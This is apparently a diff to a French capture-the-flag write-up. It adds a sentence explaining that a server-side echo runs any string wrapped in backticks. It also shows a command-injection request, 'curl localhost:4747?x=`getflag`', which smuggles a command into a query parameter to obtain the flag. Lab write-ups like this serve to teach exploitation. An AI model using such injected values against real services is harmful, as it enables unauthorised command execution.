@@ -1,2 +1,4 @@
 il suffit de faire la requete.
 curl localhost:4747?x=\`getflag\`
+
+on ce sert du faite que la commande echo execute la string qu'on lui passe en parametre si jamais elle est contenue dans des `` avant de faire son affichage
